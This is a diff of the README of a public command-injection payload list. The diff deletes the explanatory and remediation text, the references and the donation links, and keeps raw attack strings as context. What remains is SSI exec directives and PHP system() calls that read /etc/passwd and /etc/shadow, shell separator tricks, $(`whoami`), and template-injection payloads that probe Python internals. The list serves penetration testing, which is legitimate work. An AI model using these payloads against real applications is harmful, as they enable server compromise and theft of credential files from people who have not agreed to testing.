@@ -1,40 +1,3 @@
-## Command Injection Payload List
-
-<p align="center">
-  <img src="https://cdn.rawgit.com/sindresorhus/awesome/d7305f38d29fed78fa85652e3a63e154dd8e8829/media/badge.svg"> <img src="https://img.shields.io/github/stars/payloadbox/command-injection-payload-list?style=social"> <img src="https://img.shields.io/github/forks/payloadbox/command-injection-payload-list?style=social"> <img src="https://img.shields.io/github/repo-size/payloadbox/command-injection-payload-list"> <img src="https://img.shields.io/github/license/payloadbox/command-injection-payload-list"> <img src="https://img.shields.io/github/issues/detail/author/payloadbox/command-injection-payload-list/1">
-</p>
-
-Command injection is an attack in which the goal is execution of arbitrary commands on the host operating system via a vulnerable application. Command injection attacks are possible when an application passes unsafe user supplied data (forms, cookies, HTTP headers etc.) to a system shell. In this attack, the attacker-supplied operating system commands are usually executed with the privileges of the vulnerable application. Command injection attacks are possible largely due to insufficient input validation.
-
-This attack differs from Code Injection, in that code injection allows the attacker to add his own code that is then executed by the application. In Command Injection, the attacker extends the default functionality of the application, which execute system commands, without the necessity of injecting code. 
-
-## What is OS command injection?
-
-OS command Injection is a critical vulnerability that allows attackers to gain complete control over an affected web site and the underlying web server.
-
-OS command injection vulnerabilities arise when an application incorporates user data into an operating system command that it executes. An attacker can manipulate the data to cause their own commands to run. This allows the attacker to carry out any action that the application itself can carry out, including reading or modifying all of its data and performing privileged actions.
-
-In addition to total compromise of the web server itself, an attacker can leverage a command injection vulnerability to pivot the attack in the organization's internal infrastructure, potentially accessing any system which the web server can access. They may also be able to create a persistent foothold within the organization, continuing to access compromised systems even after the original vulnerability has been fixed.
-
-## Description :
-
-Operating system command injection vulnerabilities arise when an application incorporates user-controllable data into a command that is processed by a shell command interpreter. If the user data is not strictly validated, an attacker can use shell metacharacters to modify the command that is executed, and inject arbitrary further commands that will be executed by the server.
-
-OS command injection vulnerabilities are usually very serious and may lead to compromise of the server hosting the application, or of the application's own data and functionality. It may also be possible to use the server as a platform for attacks against other systems. The exact potential for exploitation depends upon the security context in which the command is executed, and the privileges that this context has regarding sensitive resources on the server.
-
-## Remediation:
-
-If possible, applications should avoid incorporating user-controllable data into operating system commands. In almost every situation, there are safer alternative methods of performing server-level tasks, which cannot be manipulated to perform additional commands than the one intended.
-
-If it is considered unavoidable to incorporate user-supplied data into operating system commands, the following two layers of defense should be used to prevent attacks:
-
-* The user data should be strictly validated. Ideally, a whitelist of specific accepted values should be used. Otherwise, only short alphanumeric strings should be accepted. Input containing any other data, including any conceivable shell metacharacter or whitespace, should be rejected.
-
-* The application should use command APIs that launch a specific process via its name and command-line parameters, rather than passing a command string to a shell interpreter that supports command chaining and redirection. For example, the Java API Runtime.exec and the ASP.NET API Process.Start do not support shell metacharacters. This defense can mitigate
-
-### Unix :
-
-```
 &lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/passwd&quot;--&gt;
 &lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/shadow&quot;--&gt;
 &lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;
@@ -137,11 +100,6 @@ cat /etc/passwd
 <!--#exec cmd="/usr/bin/id;-->
 system('cat /etc/passwd');
 <?php system("cat /etc/passwd");?>
-```
-
-### Windows :
-
-```
 `
 || 
 | 
@@ -559,47 +517,3 @@ $(`whoami`)
 {1} + {1}
 {% For c in [1,2,3]%} {{c, c, c}} {% endfor%}
 {{[] .__ Class __.__ base __.__ subclasses __ ()}}
-```
-#### References :
-
-###### Testing for Command Injection (OTG-INPVAL-013)
-
-* 👉 https://www.owasp.org/index.php/Testing_for_Command_Injection_(OTG-INPVAL-013)
-
-###### OWASP Command Injection
-
-* 👉 https://www.owasp.org/index.php/Command_Injection
-
-###### WE-77: Improper Neutralization of Special Elements used in a Command ('Command Injection')
-
-* 👉 http://cwe.mitre.org/data/definitions/77.html
-
-###### WE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection'
-
-* 👉 http://cwe.mitre.org/data/definitions/78.html
-
-###### Portswigger Web Security - OS Command Injection
-
-* 👉 https://portswigger.net/kb/issues/00100100_os-command-injection
-
-### Cloning an Existing Repository ( Clone with HTTPS )
-```
-root@ismailtasdelen:~# git clone https://github.com/ismailtasdelen/command-injection-payload-list.git
-```
-
-### Cloning an Existing Repository ( Clone with SSH )
-```
-root@ismailtasdelen:~# git clone git@github.com:ismailtasdelen/command-injection-payload-list.git
-```
-
-##### Donate!
-
-Support the authors:
-
-##### Paypal:
-
-https://paypal.me/ismailtsdln
-
-##### LiberaPay:
-
-<noscript><a href="https://liberapay.com/ismailtasdelen/donate"><img alt="Donate using Liberapay" src="https://liberapay.com/assets/widgets/donate.svg"></a></noscript>
